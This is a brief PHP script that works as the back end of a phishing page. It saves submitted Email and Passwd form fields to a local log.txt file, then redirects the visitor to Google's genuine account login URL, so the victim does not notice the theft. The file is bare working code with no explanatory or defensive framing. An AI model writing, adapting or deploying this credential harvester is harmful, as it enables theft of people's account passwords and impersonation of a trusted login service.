<?php 

$handle = fopen("log.txt", "w"); 
fwrite($handle,$_POST["Email"]); 
fwrite($handle,"\n"); 
fwrite($handle,$_POST["Passwd"]); 
fwrite($handle,"\n"); 
fwrite($handle,"\n"); 
fclose($handle) ; 
header("Location:https://www.google.com/accounts/ServiceLoginAuth"); 
exit; ?> 